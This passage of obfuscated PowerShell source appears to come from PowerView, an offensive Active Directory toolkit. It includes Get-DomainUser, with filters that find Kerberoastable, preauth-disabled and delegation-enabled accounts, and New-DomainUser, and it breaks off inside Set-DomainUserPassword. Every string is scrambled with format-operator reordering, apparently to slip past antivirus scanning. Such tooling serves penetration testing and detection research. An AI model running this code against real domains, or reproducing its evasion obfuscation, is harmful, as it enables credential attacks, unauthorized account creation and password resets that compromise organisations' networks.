        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserReferencePropertySet = @(("{2}{0}{1}" -f 'm','incount','ad'),("{2}{3}{1}{0}" -f 'es','xpir','acco','unte'),("{4}{0}{1}{2}{3}"-f 's','w','ordt','ime','badpas'),("{3}{1}{2}{0}"-f 'unt','dpwd','co','ba'),'cn',("{1}{0}{2}"-f 'depag','co','e'),("{3}{2}{1}{0}" -f 'ode','ryc','ount','c'),("{1}{2}{0}"-f 'ion','des','cript'), ("{1}{0}{2}" -f 'a','displ','yname'),("{3}{1}{2}{0}"-f 'name','ingu','ished','dist'),("{5}{0}{1}{4}{3}{2}"-f'e','prop','a','tiondat','aga','dscor'),("{3}{0}{2}{1}"-f 'en','e','nam','giv'),("{0}{2}{1}" -f'insta','etype','nc'),("{2}{3}{1}{0}{4}" -f'obj','m','iscritica','lsyste','ect'),("{2}{1}{0}" -f'goff','astlo','l'),("{1}{0}{2}" -f 'tl','las','ogon'),("{3}{1}{0}{2}{4}" -f'me','i','s','lastlogont','tamp'),("{0}{2}{1}" -f 'lockout','e','tim'),("{1}{0}{2}{3}" -f'ogonco','l','u','nt'),("{2}{0}{1}"-f'embe','rof','m'),("{2}{7}{1}{5}{6}{4}{3}{0}"-f 's','suppor','m','type','on','ted','encrypti','sds-'),("{1}{0}"-f'me','na'),("{2}{1}{3}{0}" -f'ategory','ct','obje','c'),("{0}{1}{2}{3}" -f'ob','jectc','las','s'),("{0}{2}{1}" -f 'ob','guid','ject'),("{2}{1}{0}" -f 'id','ts','objec'),("{0}{2}{3}{1}" -f 'pri','d','m','arygroupi'),("{2}{0}{1}"-f 'lasts','et','pwd'),("{1}{0}{2}"-f'm','sa','accountname'),("{3}{0}{2}{1}"-f'u','e','nttyp','samacco'),'sn',("{1}{3}{0}{4}{2}"-f'era','u','ntcontrol','s','ccou'),("{0}{4}{1}{3}{2}"-f'us','nc','me','ipalna','erpri'),("{1}{0}{2}"-f 'nchange','us','d'),("{2}{0}{1}{3}"-f 'n','create','us','d'),("{2}{1}{0}"-f'anged','ench','wh'),("{3}{0}{2}{1}" -f 'en','reated','c','wh'))

        $GroupReferencePropertySet = @(("{0}{1}{2}"-f 'adminc','o','unt'),'cn',("{3}{2}{1}{0}"-f 'ion','pt','ri','desc'),("{1}{0}{2}{3}"-f 'gui','distin','shedn','ame'),("{0}{2}{5}{3}{6}{1}{4}" -f 'dsco','dat','repropa','a','a','g','tion'),("{0}{1}{2}" -f 'gro','upt','ype'),("{0}{2}{1}" -f'in','ype','stancet'),("{3}{5}{1}{4}{2}{6}{0}"-f'ect','ic','te','iscr','alsys','it','mobj'),("{2}{1}{0}"-f 'r','embe','m'),("{0}{2}{1}" -f'm','of','ember'),("{1}{0}" -f'e','nam'),("{1}{3}{2}{0}" -f 'ory','obj','g','ectcate'),("{3}{1}{0}{2}"-f 'ct','bje','class','o'),("{1}{0}{3}{2}" -f 'bjec','o','guid','t'),("{0}{2}{1}"-f 'ob','ctsid','je'),("{2}{0}{3}{1}" -f 'ntn','me','samaccou','a'),("{1}{2}{0}" -f'pe','samaccoun','tty'),("{3}{2}{1}{0}" -f'flags','m','te','sys'),("{0}{1}{2}" -f 'usnc','h','anged'),("{1}{0}{2}"-f'ncre','us','ated'),("{2}{3}{1}{0}" -f 'd','ge','wh','enchan'),("{0}{1}{2}"-f'wh','enc','reated'))

        $ComputerReferencePropertySet = @(("{2}{0}{1}{3}"-f 'ount','e','acc','xpires'),("{4}{0}{2}{3}{1}"-f'dp','rdtime','assw','o','ba'),("{3}{0}{1}{2}"-f'pwdc','o','unt','bad'),'cn',("{0}{1}" -f 'cod','epage'),("{2}{0}{1}{3}"-f'ou','ntryc','c','ode'),("{2}{3}{1}{0}"-f'me','dna','disting','uishe'),("{1}{3}{0}{2}"-f't','dnsho','name','s'),("{0}{3}{1}{2}{4}" -f 'ds','ore','propagationd','c','ata'),("{0}{1}{3}{2}"-f'in','st','cetype','an'),("{1}{2}{0}{3}" -f'ti','i','scri','calsystemobject'),("{0}{1}{2}{3}" -f 'l','a','stlogo','ff'),("{2}{1}{0}"-f'ogon','tl','las'),("{3}{1}{0}{2}" -f'am','st','p','lastlogontime'),("{1}{4}{0}{3}{2}" -f'fl','localpolic','gs','a','y'),("{0}{1}{2}"-f'l','ogoncou','nt'),("{0}{1}{5}{3}{4}{2}"-f'm','sds-support','ypes','encryp','tiont','ed'),("{1}{0}" -f 'e','nam'),("{2}{1}{3}{0}{4}" -f'ctcateg','j','ob','e','ory'),("{2}{3}{0}{1}"-f'as','s','objectc','l'),("{2}{0}{1}" -f'jec','tguid','ob'),("{2}{0}{1}" -f'bj','ectsid','o'),("{0}{2}{3}{1}" -f 'ope','tem','ra','tingsys'),("{0}{2}{4}{3}{1}"-f'operatin','k','gsystem','c','servicepa'),("{5}{2}{0}{4}{3}{1}" -f'atin','sion','er','stemver','gsy','op'),("{4}{0}{1}{2}{3}" -f 'r','imarygrou','p','id','p'),("{2}{0}{3}{1}" -f 'last','et','pwd','s'),("{1}{4}{3}{2}{0}" -f'me','sama','na','count','c'),("{2}{1}{3}{0}"-f 'e','tty','samaccoun','p'),("{1}{4}{2}{0}{3}"-f'cip','s','prin','alname','ervice'),("{0}{1}{2}{3}" -f'userac','c','ountcont','rol'),("{0}{1}{2}"-f 'usnchan','ge','d'),("{0}{2}{1}"-f 'usn','ated','cre'),("{1}{2}{0}"-f 'ed','whenc','hang'),("{2}{1}{0}" -f 'ted','encrea','wh'))

        $SearcherArguments = @{}
        if ($PSBoundParameters[("{0}{1}"-f'Doma','in')]) { $SearcherArguments[("{1}{0}" -f 'ain','Dom')] = $Domain }
        if ($PSBoundParameters[("{1}{0}{2}"-f'PFil','LDA','ter')]) { $SearcherArguments[("{0}{2}{3}{1}"-f 'L','ilter','DAP','F')] = $LDAPFilter }
        if ($PSBoundParameters[("{1}{2}{0}"-f'hBase','Sear','c')]) { $SearcherArguments[("{0}{2}{1}{3}"-f 'Sea','chB','r','ase')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'S','er','ver')]) { $SearcherArguments[("{0}{2}{1}"-f'Serv','r','e')] = $Server }
        if ($PSBoundParameters[("{1}{2}{3}{0}"-f'pe','Sea','rchS','co')]) { $SearcherArguments[("{2}{1}{0}"-f'ope','hSc','Searc')] = $SearchScope }
        if ($PSBoundParameters[("{0}{1}{2}"-f'R','es','ultPageSize')]) { $SearcherArguments[("{0}{1}{2}"-f'Resu','ltPag','eSize')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{2}{0}{4}{1}" -f 'rTime','mit','ve','Ser','Li')]) { $SearcherArguments[("{2}{0}{3}{1}"-f'rv','meLimit','Se','erTi')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'one','ombst','T')]) { $SearcherArguments[("{2}{0}{1}"-f'n','e','Tombsto')] = $Tombstone }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'C','red','ential')]) { $SearcherArguments[("{0}{1}{2}"-f'Cred','enti','al')] = $Credential }

        
        if ($PSBoundParameters[("{0}{1}{2}"-f 'D','oma','in')]) {
            if ($PSBoundParameters[("{0}{1}{2}"-f 'Cr','eden','tial')]) {
                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose ('[Fi'+'nd-Domain'+'O'+'bje'+'c'+'t'+'Proper'+'ty'+'O'+'utlie'+'r] '+'En'+'umera'+'ted '+'fore'+'st '+"'$TargetForest' "+'fo'+'r '+'t'+'arge'+'t '+'d'+'omai'+'n '+"'$Domain'")
        }

        $SchemaArguments = @{}
        if ($PSBoundParameters[("{2}{1}{0}" -f 'l','a','Credenti')]) { $SchemaArguments[("{2}{1}{0}"-f 'ial','nt','Crede')] = $Credential }
        if ($TargetForest) {
            $SchemaArguments[("{2}{1}{0}" -f 't','res','Fo')] = $TargetForest
        }
    }

    PROCESS {

        if ($PSBoundParameters[("{0}{1}{2}{3}"-f'ReferenceP','r','o','pertySet')]) {
            Write-Verbose ("{14}{1}{9}{7}{10}{0}{6}{12}{20}{4}{18}{11}{15}{19}{8}{3}{17}{2}{5}{13}{16}" -f 'b','Find','Refer','ecifie','yOutli','e','j','ai','sp','-Dom','nO',' ','ectPr','ncePropertySe','[','U','t','d -','er]','sing ','opert')
            $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters[("{2}{3}{4}{1}{0}"-f 'ject','eOb','Re','f','erenc')]) {
            Write-Verbose ("{1}{14}{15}{0}{10}{11}{20}{13}{7}{5}{6}{18}{17}{12}{21}{19}{4}{9}{16}{8}{3}{2}"-f'inOb','[Find','et','ference property s','ect to ','acting p','roperty n','r] Extr',' the re','use a','jectPropertyOu','tl','e','e','-Dom','a','s','-Refer','ames from ','j','i','nceOb')
            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose ('[F'+'ind-'+'Domain'+'ObjectP'+'roperty'+'Outli'+'e'+'r]'+' '+'Calc'+'ul'+'ated '+'R'+'ef'+'eren'+'ceO'+'bje'+'ctCl'+'ass '+': '+"$ReferenceObjectClass")
        }
        else {
            Write-Verbose ('['+'Find-Doma'+'inObje'+'c'+'tP'+'ropertyOut'+'l'+'ier] '+'U'+'sing '+'t'+'he '+'defau'+'lt '+'re'+'fer'+'ence '+'propert'+'y'+' '+'se'+'t '+'fo'+'r '+'th'+'e '+'object'+' '+'cl'+'ass '+"'$ClassName'")
        }

        if (($ClassName -eq ("{0}{1}"-f'U','ser')) -or ($ReferenceObjectClass -eq ("{0}{1}"-f 'Use','r'))) {
            $Objects = Get-DomainUser @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq ("{1}{0}" -f 'oup','Gr')) -or ($ReferenceObjectClass -eq ("{0}{1}" -f'Gro','up'))) {
            $Objects = Get-DomainGroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq ("{1}{0}" -f'uter','Comp')) -or ($ReferenceObjectClass -eq ("{2}{0}{1}" -f'ompute','r','C'))) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw ('[Fi'+'n'+'d-Domai'+'nOb'+'jectProperty'+'O'+'utlier] '+'Inva'+'lid '+'class'+': '+"$ClassName")
        }

        ForEach ($Object in $Objects) {
            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty ("{2}{1}{3}{0}"-f 'Name','ou','SamAcc','nt') $Object.SamAccountName
                    $Out | Add-Member Noteproperty ("{0}{1}{2}" -f 'P','rope','rty') $ObjectProperty
                    $Out | Add-Member Noteproperty ("{1}{0}"-f 'alue','V') $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, ("{2}{0}{1}{4}{5}{6}{3}" -f 'w','er','Po','r','V','i','ew.PropertyOutlie'))
                    $Out
                }
            }
        }
    }
}








function Get-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{1}{3}{6}{5}{0}{7}"-f'gnm','e','eD','claredVa','PSUs','nAssi','rsMoreTha','ents'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}" -f 'PS','rocess','P','Should'}, '')]
    [OutputType({"{0}{1}{2}{3}"-f 'Po','werVi','ew.U','ser'})]
    [OutputType({"{2}{1}{3}{0}"-f'aw','erView.U','Pow','ser.R'})]
    [CmdletBinding(DefaultParameterSetName = {"{0}{4}{1}{3}{2}" -f'A','wDe','ation','leg','llo'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}{2}{3}" -f'tin','Dis','guishedNa','me'}, {"{0}{2}{1}{3}"-f 'SamA','unt','cco','Name'}, {"{0}{1}"-f 'N','ame'}, {"{4}{2}{5}{1}{3}{0}{6}"-f'Nam','nguishe','mberDist','d','Me','i','e'}, {"{0}{2}{1}{3}" -f 'Me','er','mb','Name'})]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = "allo`w`de`LegAtiOn")]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = "diSA`LlOWDe`LE`Ga`TiON")]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias({"{3}{4}{0}{1}{2}" -f'hNo','tRequire','d','Kerbe','rosPreaut'}, {"{1}{0}{2}" -f 'o','N','Preauth'})]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'r','Filte'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'A','DSPath'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}"-f 'mainContro','lle','Do','r'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{2}{0}{1}" -f'eLev','el','On'}, {"{0}{2}{1}"-f 'Su','tree','b'})]
        [String]
        $SearchScope = ("{1}{0}"-f'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{1}{0}"-f 'acl','D'}, {"{0}{1}" -f'Gr','oup'}, {"{1}{0}"-f 'e','Non'}, {"{1}{0}" -f 'wner','O'}, {"{0}{1}" -f'S','acl'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{1}{0}"-f 'turnOne','Re'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f'n','Domai')]) { $SearcherArguments[("{1}{0}"-f 'n','Domai')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'rti','es','Prope')]) { $SearcherArguments[("{2}{0}{1}"-f'o','perties','Pr')] = $Properties }
        if ($PSBoundParameters[("{1}{0}{2}" -f'hBa','Searc','se')]) { $SearcherArguments[("{0}{2}{1}"-f 'Sea','chBase','r')] = $SearchBase }
        if ($PSBoundParameters[("{1}{0}" -f'rver','Se')]) { $SearcherArguments[("{0}{1}"-f'Serv','er')] = $Server }
        if ($PSBoundParameters[("{3}{0}{1}{2}"-f 'c','hSc','ope','Sear')]) { $SearcherArguments[("{2}{0}{1}" -f 'archScop','e','Se')] = $SearchScope }
        if ($PSBoundParameters[("{0}{3}{1}{4}{2}" -f'R','ltP','ize','esu','ageS')]) { $SearcherArguments[("{0}{2}{1}" -f'R','ageSize','esultP')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{1}{2}{0}" -f't','r','verTimeLimi','Se')]) { $SearcherArguments[("{3}{2}{0}{4}{1}" -f 'rTi','t','e','Serv','meLimi')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{3}{2}{0}"-f's','Se','Mask','curity')]) { $SearcherArguments[("{3}{2}{1}{0}"-f 'rityMasks','u','ec','S')] = $SecurityMasks }
        if ($PSBoundParameters[("{1}{2}{0}"-f 'one','Tomb','st')]) { $SearcherArguments[("{1}{2}{0}"-f'ne','T','ombsto')] = $Tombstone }
        if ($PSBoundParameters[("{2}{1}{0}"-f'l','a','Credenti')]) { $SearcherArguments[("{0}{1}{2}{3}" -f'Cr','ed','enti','al')] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match ("{1}{0}"-f '1-','^S-')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match ("{0}{1}"-f '^CN','=')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[("{1}{2}{0}"-f 'n','Do','mai')]) -and (-not $PSBoundParameters[("{1}{0}{2}"-f'hBas','Searc','e')])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('['+'Get'+'-'+'Domain'+'User] '+'E'+'xtr'+'act'+'ed '+'dom'+'ai'+'n '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        $SearcherArguments[("{0}{2}{1}" -f'Dom','in','a')] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning ('[Get'+'-Do'+'mainUser'+'] '+'Un'+'a'+'ble '+'t'+'o '+'r'+'etrieve '+'d'+'omain'+' '+'sear'+'ch'+'er '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments[("{1}{0}" -f 'main','Do')] = $UserDomain
                        Write-Verbose ('['+'Get'+'-Dom'+'ai'+'nUser'+'] '+'E'+'xtract'+'e'+'d '+'dom'+'ai'+'n '+"'$UserDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose ("{10}{13}{3}{12}{14}{7}{6}{5}{15}{8}{0}{1}{11}{2}{9}{16}{4}" -f 'on-nul','l service p','nc','t',' names','ing ','earch','nUser] S','n','ip','[','ri','-Doma','Ge','i','for ','al')
                $Filter += ("{1}{2}{0}{5}{4}{3}"-f 'ri','(servic','eP','*)','=','ncipalName')
            }
            if ($PSBoundParameters[("{0}{2}{1}" -f 'Allow','on','Delegati')]) {
                Write-Verbose ("{2}{0}{8}{12}{14}{9}{4}{11}{1}{3}{5}{13}{7}{6}{10}" -f'Get-D','r ','[','users who can ','ing f','b','ga',' dele','omainUs','earch','ted','o','er]','e',' S')
                
                $Filter += ("{10}{11}{12}{7}{8}{1}{5}{6}{2}{4}{9}{3}{0}{13}" -f'4','rol:1.2.840.','1.4.',':=104857','80','113','556.','ountCon','t','3','(!(us','erA','cc','))')
            }
            if ($PSBoundParameters[("{1}{3}{0}{4}{2}"-f 'Deleg','Disal','tion','low','a')]) {
                Write-Verbose ("{2}{6}{3}{10}{4}{13}{0}{5}{11}{12}{8}{1}{7}{14}{9}"-f'or users wh','usted ','[Get-D','ma','ser] Searching ','o are sensiti','o','for d','r','ation','inU','ve a','nd not t','f','eleg')
                $Filter += (("{6}{2}{10}{5}{3}{8}{7}{11}{4}{1}{9}{0}" -f'4)','04','u','.840.11','=1','tControl:1.2','(userAcco','.1','3556','857','n','.4.803:'))
            }
            if ($PSBoundParameters[("{2}{1}{0}" -f'ount','nC','Admi')]) {
                Write-Verbose ("{0}{6}{4}{11}{10}{8}{7}{3}{5}{2}{9}{1}" -f '[G','1','u','fo','-Do','r adminCo','et','ing ','Search','nt=','r] ','mainUse')
                $Filter += (("{1}{2}{0}"-f 'unt=1)','(adminc','o'))
            }
            if ($PSBoundParameters[("{3}{0}{2}{4}{1}"-f 'r','Auth','u','T','stedTo')]) {
                Write-Verbose ("{6}{7}{3}{4}{0}{10}{9}{8}{14}{13}{11}{2}{1}{12}{5}"-f'Searchin','r ','uthenticate fo','main','User] ','principals','[Get','-Do','sers that are','for u','g ','to a','other ','trusted ',' ')
                $Filter += ("{0}{1}{5}{2}{3}{4}"-f'(msds-allowe','dt','ateto=','*',')','odeleg')
            }
            if ($PSBoundParameters[("{2}{1}{3}{0}" -f 'ed','hNotReq','Preaut','uir')]) {
                Write-Verbose ("{15}{8}{2}{11}{6}{10}{1}{4}{0}{5}{7}{13}{9}{17}{18}{3}{14}{16}{12}" -f 's ','e',' Sea','ke','r account','th','ng for u','at do n','-DomainUser]','requ','s','rchi','thenticate','ot ','rberos p','[Get','reau','ir','e ')
                $Filter += (("{1}{12}{7}{4}{3}{9}{10}{2}{5}{6}{11}{8}{13}{0}" -f'04)','(userAccountContr','1','84','.','.','4.803',':1.2','19','0.','113556.',':=4','ol','43'))
            }
            if ($PSBoundParameters[("{0}{2}{1}" -f'LD','r','APFilte')]) {
                Write-Verbose ('[Get'+'-Dom'+'ainUser'+'] '+'U'+'si'+'ng '+'ad'+'dit'+'ional '+'LDA'+'P '+'fi'+'lter:'+' '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match ("{2}{0}{1}" -f '_.','*','NOT')) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if ($PSBoundParameters[("{2}{1}{0}"-f'e','dOn','Fin')]) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, ("{1}{2}{0}{3}"-f'.User.R','Power','View','aw'))
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, ("{2}{1}{3}{0}" -f'.User','owerV','P','iew'))
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[Get'+'-Domai'+'nUs'+'er] '+'Er'+'ro'+'r '+'di'+'spo'+'sing '+'of'+' '+'the'+' '+'R'+'es'+'ults '+'ob'+'je'+'ct: '+"$_")
                }
            }
            $UserSearcher.dispose()
        }
    }
}


function New-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{1}{2}{4}{3}{0}{5}{7}{6}"-f 'c','e','ShouldProcessForS','un','tateChangingF','ti','s','on','PSUs'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{4}{1}{2}"-f 'ShouldPr','es','s','PS','oc'}, '')]
    [OutputType({"{2}{4}{6}{1}{7}{8}{3}{5}{9}{0}" -f 'l','c','Direct','tManagemen','orySer','t','vi','es.Accou','n','.UserPrincipa'})]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ssword','Pa'})]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Description,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{
        ("{1}{0}" -f 'ity','Ident') = $SamAccountName
    }
    if ($PSBoundParameters[("{2}{1}{0}" -f'ain','m','Do')]) { $ContextArguments[("{1}{0}" -f'omain','D')] = $Domain }
    if ($PSBoundParameters[("{2}{1}{0}"-f 'ntial','ede','Cr')]) { $ContextArguments[("{2}{1}{0}"-f 'ential','ed','Cr')] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)

        
        $User.SamAccountName = $Context.Identity
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters[("{0}{1}"-f'Nam','e')]) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters[("{3}{2}{0}{1}" -f'yNa','me','a','Displ')]) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }

        if ($PSBoundParameters[("{2}{0}{3}{1}"-f 'script','n','De','io')]) {
            $User.Description = $Description
        }

        Write-Verbose ('[Ne'+'w'+'-Do'+'main'+'User] '+'Attemp'+'ti'+'n'+'g '+'to'+' '+'c'+'reate'+' '+'us'+'er '+"'$SamAccountName'")
        try {
            $Null = $User.Save()
            Write-Verbose ('[New-Dom'+'ainUse'+'r'+'] '+'Us'+'er '+"'$SamAccountName' "+'su'+'c'+'cessful'+'ly '+'c'+'reate'+'d')
            $User
        }
        catch {
            Write-Warning ('[New-Dom'+'ai'+'nUse'+'r] '+'Erro'+'r'+' '+'creat'+'in'+'g '+'use'+'r '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function Set-DomainUserPassword {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{11}{3}{8}{10}{1}{7}{2}{5}{4}{12}{6}{9}"-f 'PS','uldProc','te','eS','in','Chang','unc','essForSta','h','tions','o','Us','gF'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}"-f'ss','P','SShouldPr','oce'}, '')]
    [OutputType({"{2}{0}{1}{6}{5}{9}{3}{4}{7}{8}"-f 'o','r','Direct','untMa','nagement.Use','.','yServices','rPri','ncipal','Acco'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias({"{2}{0}{1}"-f 'erNa','me','Us'}, {"{1}{2}{0}" -f'ty','Use','rIdenti'}, {"{0}{1}" -f'Use','r'})]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'as','sword','P'})]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $ContextArguments = @{ ("{1}{0}{2}"-f 'ti','Iden','ty') = $Identity }
    if ($PSBoundParameters[("{1}{0}{2}"-f'i','Doma','n')]) { $ContextArguments[("{1}{0}" -f'n','Domai')] = $Domain }
    if ($PSBoundParameters[("{0}{1}{2}"-f'Cred','ent','ial')]) { $ContextArguments[("{2}{1}{0}"-f 'edential','r','C')] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments

    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)

        if ($User) {
            Write-Verbose ('[S'+'e'+'t-DomainU'+'serP'+'assword'+']'+' '+'Attem'+'p'+'ting'+' '+'to'+' '+'se'+'t '+'t'+'he '+'pa'+'ssw'+'or'+'d '+'for'+' '+'us'+'er '+"'$Identity'")
            try {
                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose ('[Set-'+'Do'+'mainU'+'ser'+'Pass'+'word] '+'P'+'as'+'sword '+'fo'+'r '+'user'+' '+"'$Identity' "+'suc'+'ces'+'sfu'+'lly '+'re'+'set')
            }
            catch {
